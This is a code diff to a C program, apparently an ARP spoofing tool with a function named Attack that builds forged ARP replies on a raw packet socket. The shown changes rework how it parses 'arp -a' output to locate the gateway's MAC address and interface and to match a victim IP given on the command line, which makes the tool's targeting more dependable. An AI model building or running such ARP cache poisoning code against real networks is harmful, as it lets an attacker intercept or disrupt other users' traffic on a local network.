@@ -28,7 +28,6 @@ void Attack(void* info){
   struct in_addr src_in_addr, target_in_addr;
   struct ARP_header attack_packet; // reply
   struct sockaddr sa;
-  //char* recv_str;
   int sock;
   sock = socket(AF_INET, SOCK_PACKET, htons(ETH_P_RARP));
   if(sock<0){ perror("socket error"); exit(1); }
@@ -120,31 +119,46 @@ int main(int argc, char* argv[]) {
   FILE* fp = NULL; char line[100]; char* gw_mac_addr; char* dev;
   if((fp = popen("arp -a", "r")) == NULL){ return 1; }
 
+  int cnt2 = 0;
   while(1){
     fgets(line, 100, fp);
-    if(line[1] == 'g') break;
+    //printf("%s\n", line);
+    char* ptr1; int cnt1 = 0;
+    char* line_result1[10];
+    char* line_result2[10];
+    ptr1 = strtok(line, " ");
+    while(ptr1 != NULL){
+      //printf("%s\n", ptr1);
+      line_result1[cnt1] = ptr1;
+      cnt1++;
+      ptr1 = strtok(NULL, " ");
+    }
+    cnt1 = 0;
+    char* final_dst = (char*)malloc(sizeof(char) * 20);
+    if(final_dst == NULL) { perror("final_dst malloc fail"); exit(1); }
+    char* dst = (char*)malloc(sizeof(char) * 20);
+    if(dst == NULL) { perror("dst malloc fail"); exit(1); }
+    char* src = line_result1[1];
+    delChar(src, dst, '(');
+    delChar(dst, final_dst, ')');
+    
+    char* ptr2 = strtok(final_dst, ".");
+    while(ptr2 != NULL){
+      //printf("%s\n", ptr2);
+      line_result2[cnt1] = ptr2;
+      cnt1++;
+      ptr2 = strtok(NULL, ".");
+    }
+    if(!(strncmp(line_result2[3], "1", strlen(line_result2[3])))){
+      dev = line_result1[6];
+      *(dev+(strlen(dev)-1)) = 0;
+      gw_mac_addr = line_result1[3];
+      break;
+    }
+    cnt2++;
+    if(cnt2 > 10) break;
   }
-
-  char* ptr; int cnt = 0;
-  char* line_result[10];
-  ptr = strtok(line, " ");
-  while(ptr != NULL){
-    //printf("%s\n", ptr);
-    line_result[cnt] = ptr;
-    cnt++;
-    ptr = strtok(NULL, " ");
-  }
-
-  if(sizeof(line_result) > 0){
-    gw_mac_addr = line_result[3];
-    dev = line_result[6];
-    *(dev+(strlen(dev)-1)) = 0;
-    printf("gw_mac_addr : %s\n", gw_mac_addr);
-    printf("dev : %s\n", dev);
-  }
-  else { perror("Can't find Gateway MAC address"); exit(1); }
   pclose(fp);
-
 // ########################################
 
 // ########## Make a file to write ##########
@@ -323,7 +337,8 @@ arph->sender_mac_addr[1], arph->sender_mac_addr[2], arph->sender_mac_addr[3], ar
     //printf("%s\n", dst);
     delChar(dst, final_dst, ')');
     //printf("%s\n", final_dst);
-    if(strcmp(final_dst, argv[1]) == 0){
+    //printf("%s\n", argv[1]);
+    if(!(strncmp(final_dst, argv[1], strlen(argv[1])))){
       sender_mac = line_result1[3];
       break;
     }
